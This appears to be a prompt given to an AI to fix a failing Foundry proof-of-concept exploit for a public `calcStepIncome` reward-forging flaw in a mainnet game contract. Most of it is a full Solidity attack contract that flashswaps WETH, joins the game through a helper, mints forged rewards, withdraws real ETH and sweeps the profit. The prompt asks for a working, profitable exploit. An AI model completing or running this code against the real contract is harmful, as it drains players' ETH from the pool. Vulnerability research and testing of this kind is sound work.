You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public `calcStepIncome` lets any player mint arbitrary withdrawable rewards
- claim: `calcStepIncome` is `public` and performs no authorization or caller-context checks, so any externally owned account can credit `stepIncome` and `totalSettled` for any PID up to that PID's `playBiggertReward`. Those forged earnings are then withdrawable through `withdraw()`. Because the function also decrements `mainPoolBalance` without checking pool sufficiency, oversized calls can additionally corrupt pool accounting via underflow.
- impact: An attacker can join once, mint themselves rewards they never earned, and withdraw real ETH from `mainPoolWithdrawBalance`. This is a permissionless drain of the round's withdrawable liquidity, with additional accounting corruption if `mainPoolBalance` is driven below zero.
- exploit_paths: ["Join the game to obtain an active PID and a nonzero `playBiggertReward` cap.", "Call `calcStepIncome(attackerPid, attackerChosenValue, attackerChosenDividend)` directly until `totalSettled` reaches the desired forged amount.", "Call `withdraw()` to convert the fabricated balance into ETH from the round's withdrawable pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IAddrManagerLike {
    function getAddr(string calldata name_) external view returns (address);
}

interface IMainPoolLike {
    function joinGame(address parentAddr) external payable;
    function withdraw() external;
    function calcStepIncome(uint256 pid_, uint256 value_, uint8 dividendAccount_) external;

    function getRID() external view returns (uint256 rid_);
    function getPoolInfo(uint256 rid_)
        external
        view
        returns (
            uint256 totalInBalance_,
            uint256 totalDivBalance_,
            uint256 totalInsBalance_,
            uint256 totalPlayers_,
            uint256 totalDisADC_
        );
    function getPlayerInfo(address ply_, uint256 rid_)
        external
        view
        returns (
            uint256 stIncome_,
            uint256 dtIncome_,
            uint256 stepIncome_,
            uint256 ambIncome_,
            uint256 doubV6Income_,
            uint256 totoalIncome_,
            uint256 withdrawAmount_,
            uint256 ticketIn_,
            uint256 canWithdrawAmount_,
            uint256 startTime_,
            uint256 liveRountAmount_
        );

    function plyrID(address player) external view returns (uint256);
    function playBiggertReward(uint256 rid, uint256 pid) external view returns (uint256);
    function mainPoolWithdrawBalance(uint256 rid) external view returns (uint256);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);

    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract AttackPlayer {
    address public immutable owner;
    address public immutable target;

    bool public joined;
    bytes32 public joinErrorHash;

    receive() external payable {}

    constructor(address target_, address parent_) payable {
        owner = msg.sender;
        target = target_;

        (bool ok, bytes memory ret) =
            target_.call{value: msg.value}(abi.encodeWithSelector(IMainPoolLike.joinGame.selector, parent_));
        joined = ok;
        if (!ok && ret.length >= 32) {
            assembly {
                sstore(joinErrorHash.slot, mload(add(ret, 32)))
            }
        }
    }

    function callCalcStep(uint256 pid, uint256 value, uint8 dividend) external returns (bool ok, bytes memory ret) {
        require(msg.sender == owner, "not-owner");
        (ok, ret) = target.call(abi.encodeWithSelector(IMainPoolLike.calcStepIncome.selector, pid, value, dividend));
    }

    function callWithdraw() external returns (bool ok, bytes memory ret) {
        require(msg.sender == owner, "not-owner");
        (ok, ret) = target.call(abi.encodeWithSelector(IMainPoolLike.withdraw.selector));
    }

    function sweepEth(address payable to) external returns (uint256 amount) {
        require(msg.sender == owner, "not-owner");
        amount = address(this).balance;
        if (amount > 0) {
            (bool ok,) = to.call{value: amount}("");
            require(ok, "eth-sweep-failed");
        }
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8;
    address internal constant ADDR_MANAGER = 0x49E298B95Bda30e6518509187Ff348e01117f404;
    address internal constant PARENT = 0x953ad059b61aA4A23fa48d5eca617D4920E3343e;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    bytes32 internal constant HELPER_SALT = keccak256("adc-f001-helper");
    uint256 internal constant ADC_STRICT_GT_BUFFER = 1;

    uint256 internal constant DIRECT_JOIN = 1 ether;
    uint256 internal constant MID_JOIN = 11 ether;
    uint256 internal constant HIGH_JOIN = 31 ether;

    uint256 internal constant SMALL_FLASH_WETH = 10 ether;
    uint256 internal constant MID_FLASH_WETH = 35 ether;
    uint256 internal constant HIGH_FLASH_WETH = 80 ether;

    uint256 internal _baselineEth;
    uint256 internal _profitAmount;
    bool internal _executed;

    address internal _adc;
    address internal _ticket;
    address internal _helper;
    address internal _flashPair;
    uint256 internal _flashBorrowAmount;

    bool public hypothesisValidated;
    bool public joinedGame;
    bool public calcStepUsed;
    bool public withdrewProfit;
    bool public usedFlashloan;

    uint256 public attackRid;
    uint256 public attackerPid;
    uint256 public joinValueUsed;
    uint256 public preJoinWithdrawBalance;
    uint256 public postJoinWithdrawBalance;
    uint256 public preMintWithdrawable;
    uint256 public forgedMintAmount;
    uint256 public finalClaimAmount;
    uint256 public joinBurnAdc;
    uint256 public withdrawBurnAdc;
    uint256 public calcIterations;
    bytes32 public lastFailure;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _syncProfit();
            return;
        }

        _executed = true;
        _baselineEth = address(this).balance;

        _adc = IAddrManagerLike(ADDR_MANAGER).getAddr("ADC");
        _ticket = IAddrManagerLike(ADDR_MANAGER).getAddr("TICKET");
        if (_adc == address(0) || _ticket == address(0)) {
            lastFailure = keccak256("addr-manager-missing");
            _syncProfit();
            return;
        }

        uint256 desiredJoinValue = _selectJoinValue();
        uint256 flashAmount = _selectFlashAmount(desiredJoinValue);

        if (!_startFlashswap(desiredJoinValue, flashAmount)) {
            lastFailure = keccak256("flashswap-unavailable");
        }

        _syncProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == _flashPair, "not-flash-pair");
        require(sender == address(this), "bad-sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == _flashBorrowAmount, "bad-borrow");

        uint256 desiredJoinValue = abi.decode(data, (uint256));
        _runExploit(desiredJoinValue);

        uint256 repayAmount = _getFlashRepayAmount(borrowedWeth);
        _ensureWethBalance(repayAmount);
        require(IERC20Like(WETH).transfer(msg.sender, repayAmount), "flash-repay-failed");

        uint256 residualWeth = IERC20Like(WETH).balanceOf(address(this));
        if (residualWeth > 0) {
            IWETHLike(WETH).withdraw(residualWeth);
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runExploit(uint256 desiredJoinValue) internal {
        attackRid = IMainPoolLike(TARGET).getRID();

        (, uint256 totalDivBefore,,,) = IMainPoolLike(TARGET).getPoolInfo(attackRid);
        preJoinWithdrawBalance = IMainPoolLike(TARGET).mainPoolWithdrawBalance(attackRid);

        joinValueUsed = _capJoinValue(desiredJoinValue, preJoinWithdrawBalance, totalDivBefore);
        if (joinValueUsed < DIRECT_JOIN) {
            lastFailure = keccak256("insufficient-join-capital");
            return;
        }

        {
            (bool joinBurnOk, uint256 joinBurn) = _quoteAdc(joinValueUsed, true);
            if (!joinBurnOk) {
                lastFailure = keccak256("join-burn-quote-failed");
                return;
            }
            joinBurnAdc = joinBurn;

            address helperPrediction = _computeHelperAddress();
            if (!_ensureAdcAt(helperPrediction, joinBurnAdc + ADC_STRICT_GT_BUFFER)) {
                lastFailure = keccak256("join-adc-unavailable");
                return;
            }
        }

        _unwrapWeth(joinValueUsed);

        // This preserves exploit path stage 1 exactly: the helper joins once to obtain a live PID.
        // The flashswap only supplies public on-chain working capital for the mandatory ticket cost.
        AttackPlayer helper = new AttackPlayer{salt: HELPER_SALT, value: joinValueUsed}(TARGET, PARENT);
        _helper = address(helper);

        if (!helper.joined()) {
            lastFailure = keccak256("join-call-failed");
            return;
        }

        attackerPid = IMainPoolLike(TARGET).plyrID(_helper);
        if (attackerPid == 0) {
            lastFailure = keccak256("pid-not-created");
            return;
        }

        joinedGame = true;

        uint256 totalIncomeBefore;
        uint256 ticketInAfterJoin;
        uint256 canWithdrawBefore;
        (, , , , , totalIncomeBefore, , ticketInAfterJoin, canWithdrawBefore,,) =
            IMainPoolLike(TARGET).getPlayerInfo(_helper, attackRid);

        postJoinWithdrawBalance = IMainPoolLike(TARGET).mainPoolWithdrawBalance(attackRid);
        preMintWithdrawable = canWithdrawBefore;

        if (ticketInAfterJoin == 0) {
            lastFailure = keccak256("join-did-not-activate-player");
            return;
        }

        uint256 rewardCap = IMainPoolLike(TARGET).playBiggertReward(attackRid, attackerPid);
        if (rewardCap == 0) {
            lastFailure = keccak256("zero-reward-cap");
            return;
        }

        uint256 capRemaining = rewardCap > totalIncomeBefore ? rewardCap - totalIncomeBefore : 0;
        uint256 poolRoom = postJoinWithdrawBalance > canWithdrawBefore + 1
            ? postJoinWithdrawBalance - canWithdrawBefore - 1
            : 0;

        forgedMintAmount = capRemaining < poolRoom ? capRemaining : poolRoom;
        if (forgedMintAmount == 0) {
            lastFailure = keccak256("no-safe-forge-room");
            return;
        }

        finalClaimAmount = canWithdrawBefore + forgedMintAmount;

        {
            (bool withdrawBurnOk, uint256 outBurn) = _quoteAdc(finalClaimAmount, false);
            if (!withdrawBurnOk) {
                lastFailure = keccak256("withdraw-burn-quote-failed");
                return;
            }
            withdrawBurnAdc = outBurn;

            if (!_ensureAdcAt(_helper, withdrawBurnAdc + ADC_STRICT_GT_BUFFER)) {
                lastFailure = keccak256("withdraw-adc-unavailable");
                return;
            }
        }

        uint256 canWithdrawAfterMint = _forgeWithdrawable(helper, canWithdrawBefore, finalClaimAmount);
        if (canWithdrawAfterMint <= canWithdrawBefore) {
            lastFailure = keccak256("mint-not-credited");
            return;
        }

        // This preserves exploit path stage 3 exactly: withdraw forged settled income as real ETH.
        (bool withdrawOk,) = helper.callWithdraw();
        if (!withdrawOk) {
            lastFailure = keccak256("withdraw-call-failed");
            return;
        }

        withdrewProfit = true;
        hypothesisValidated = true;

        helper.sweepEth(payable(address(this)));
    }

    function _selectJoinValue() internal view returns (uint256) {
        uint256 rid = IMainPoolLike(TARGET).getRID();
        (, uint256 totalDivBalance,,,) = IMainPoolLike(TARGET).getPoolInfo(rid);
        uint256 withdrawBalance = IMainPoolLike(TARGET).mainPoolWithdrawBalance(rid);
        uint256 safePool = totalDivBalance < withdrawBalance ? totalDivBalance : withdrawBalance;

        if (safePool >= 60 ether) {
            return HIGH_JOIN;
        }
        if (safePool >= 20 ether) {
            return MID_JOIN;
        }
        return DIRECT_JOIN;
    }

    function _selectFlashAmount(uint256 desiredJoinValue) internal pure returns (uint256) {
        if (desiredJoinValue >= HIGH_JOIN) {
            return HIGH_FLASH_WETH;
        }
        if (desiredJoinValue >= MID_JOIN) {
            return MID_FLASH_WETH;
        }
        return SMALL_FLASH_WETH;
    }

    function _capJoinValue(uint256 desiredJoinValue, uint256 withdrawBalanceBefore, uint256 totalDivBefore)
        internal
        pure
        returns (uint256)
    {
        uint256 safePool = withdrawBalanceBefore < totalDivBefore ? withdrawBalanceBefore : totalDivBefore;
        if (desiredJoinValue >= HIGH_JOIN && safePool >= 60 ether) {
            return HIGH_JOIN;
        }
        if (desiredJoinValue >= MID_JOIN && safePool >= 20 ether) {
            return MID_JOIN;
        }
        return DIRECT_JOIN;
    }

    function _quoteAdc(uint256 value, bool isIn) internal view returns (bool ok, uint256 quoted) {
        bytes memory ret;
        (ok, ret) = _ticket.staticcall(abi.encodeWithSignature("calDeductionADC(uint256,bool)", value, isIn));
        if (!ok || ret.length < 32) {
            return (false, 0);
        }
        quoted = abi.decode(ret, (uint256));
    }

    function _startFlashswap(uint256 desiredJoinValue, uint256 flashAmount) internal returns (bool) {
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHISWAP_ROUTER];
        address[3] memory bases = [USDT, USDC, DAI];

        usedFlashloan = true;
        _flashBorrowAmount = flashAmount;

        for (uint256 i = 0; i < routers.length; ++i) {
            address factory = IUniswapV2RouterLike(routers[i]).factory();
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = IUniswapV2FactoryLike(factory).getPair(WETH, bases[j]);
                if (pair == address(0)) {
                    continue;
                }

                address token0 = IUniswapV2PairLike(pair).token0();
                uint256 amount0Out = token0 == WETH ? flashAmount : 0;
                uint256 amount1Out = token0 == WETH ? 0 : flashAmount;

                _flashPair = pair;
                (bool ok,) = pair.call(
                    abi.encodeWithSelector(
                        IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), abi.encode(desiredJoinValue)
                    )
                );
                if (ok) {
                    return true;
                }
            }
        }

        _flashPair = address(0);
        _flashBorrowAmount = 0;
        return false;
    }

    function _ensureAdcAt(address recipient, uint256 needed) internal returns (bool) {
        if (needed == 0) {
            return true;
        }

        uint256 bal = IERC20Like(_adc).balanceOf(recipient);
        if (bal >= needed) {
            return true;
        }

        uint256 shortfall = needed - bal;
        if (_tryRoutersExactOut(recipient, shortfall)) {
            return IERC20Like(_adc).balanceOf(recipient) >= needed;
        }

        _tryRoutersExactIn(recipient, needed);
        return IERC20Like(_adc).balanceOf(recipient) >= needed;
    }

    function _tryRoutersExactOut(address recipient, uint256 amountOut) internal returns (bool) {
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHISWAP_ROUTER];
        address[4] memory mids = [address(0), USDT, USDC, DAI];

        for (uint256 i = 0; i < routers.length; ++i) {
            for (uint256 j = 0; j < mids.length; ++j) {
                address[] memory path = _buildPath(mids[j]);
                if (!_pathExists(routers[i], path)) {
                    continue;
                }

                (bool quoteOk, bytes memory quoteRet) =
                    routers[i].staticcall(abi.encodeWithSelector(IUniswapV2RouterLike.getAmountsIn.selector, amountOut, path));
                if (!quoteOk || quoteRet.length == 0) {
                    continue;
                }

                uint256[] memory amountsIn = abi.decode(quoteRet, (uint256[]));
                uint256 amountInMax = amountsIn[0];
                if (amountInMax == 0 || amountInMax > IERC20Like(WETH).balanceOf(address(this))) {
                    continue;
                }

                _approveWeth(routers[i], amountInMax);
                (bool ok,) = routers[i].call(
                    abi.encodeWithSelector(
                        IUniswapV2RouterLike.swapTokensForExactTokens.selector,
                        amountOut,
                        amountInMax,
                        path,
                        recipient,
                        block.timestamp
                    )
                );
                if (ok) {
                    return true;
                }
            }
        }

        return false;
    }

    function _tryRoutersExactIn(address recipient, uint256 needed) internal {
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHISWAP_ROUTER];
        address[4] memory mids = [address(0), USDT, USDC, DAI];
        uint256[7] memory budgets = [uint256(0.01 ether), 0.05 ether, 0.2 ether, 1 ether, 5 ether, 10 ether, 20 ether];

        for (uint256 i = 0; i < routers.length; ++i) {
            for (uint256 j = 0; j < mids.length; ++j) {
                address[] memory path = _buildPath(mids[j]);
                if (!_pathExists(routers[i], path)) {
                    continue;
                }

                for (uint256 k = 0; k < budgets.length; ++k) {
                    if (IERC20Like(_adc).balanceOf(recipient) >= needed) {
                        return;
                    }

                    uint256 spend = budgets[k];
                    uint256 wethBal = IERC20Like(WETH).balanceOf(address(this));
                    if (spend > wethBal) {
                        spend = wethBal;
                    }
                    if (spend == 0) {
                        return;
                    }

                    _approveWeth(routers[i], spend);
                    (bool ok,) = routers[i].call(
                        abi.encodeWithSelector(
                            IUniswapV2RouterLike.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                            spend,
                            0,
                            path,
                            recipient,
                            block.timestamp
                        )
                    );
                    ok;
                }
            }
        }
    }

    function _buildPath(address mid) internal view returns (address[] memory path) {
        if (mid == address(0)) {
            path = new address[](2);
            path[0] = WETH;
            path[1] = _adc;
            return path;
        }

        path = new address[](3);
        path[0] = WETH;
        path[1] = mid;
        path[2] = _adc;
    }

    function _pathExists(address router, address[] memory path) internal view returns (bool) {
        address factory = IUniswapV2RouterLike(router).factory();
        for (uint256 i = 0; i + 1 < path.length; ++i) {
            if (IUniswapV2FactoryLike(factory).getPair(path[i], path[i + 1]) == address(0)) {
                return false;
            }
        }
        return true;
    }

    function _approveWeth(address spender, uint256 amount) internal {
        IERC20Like(WETH).approve(spender, 0);
        IERC20Like(WETH).approve(spender, amount);
    }

    function _unwrapWeth(uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        IWETHLike(WETH).withdraw(amount);
    }

    function _ensureWethBalance(uint256 needed) internal {
        uint256 wethBal = IERC20Like(WETH).balanceOf(address(this));
        if (wethBal >= needed) {
            return;
        }

        uint256 shortfall = needed - wethBal;
        require(address(this).balance >= shortfall, "insufficient-weth-for-repay");
        IWETHLike(WETH).deposit{value: shortfall}();
    }

    function _computeHelperAddress() internal view returns (address) {
        bytes memory initCode = abi.encodePacked(type(AttackPlayer).creationCode, abi.encode(TARGET, PARENT));
        bytes32 hash =
            keccak256(abi.encodePacked(bytes1(0xff), address(this), HELPER_SALT, keccak256(initCode)));
        return address(uint160(uint256(hash)));
    }

    function _forgeWithdrawable(AttackPlayer helper, uint256 canWithdrawBefore, uint256 targetWithdrawable)
        internal
        returns (uint256 canWithdrawAfterMint)
    {
        canWithdrawAfterMint = canWithdrawBefore;

        // This preserves exploit path stage 2 exactly: once the helper has a PID and reward cap,
        // the public `calcStepIncome` is called directly to mint withdrawable settled income.
        while (canWithdrawAfterMint < targetWithdrawable) {
            uint256 attackerChosenValue = targetWithdrawable - canWithdrawAfterMint;

            (bool calcOk,) = helper.callCalcStep(attackerPid, attackerChosenValue, 100);
            if (!calcOk) {
                lastFailure = keccak256("calc-step-call-failed");
                return canWithdrawAfterMint;
            }

            calcStepUsed = true;
            unchecked {
                ++calcIterations;
            }

            (, , , , , , , , canWithdrawAfterMint,,) = IMainPoolLike(TARGET).getPlayerInfo(_helper, attackRid);

            if (canWithdrawAfterMint >= targetWithdrawable || calcIterations >= 3) {
                break;
            }
        }
    }

    function _getFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return (amountOut * 1000) / 997 + 1;
    }

    function _syncProfit() internal {
        uint256 current = address(this).balance;
        _profitAmount = current > _baselineEth ? current - _baselineEth : 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
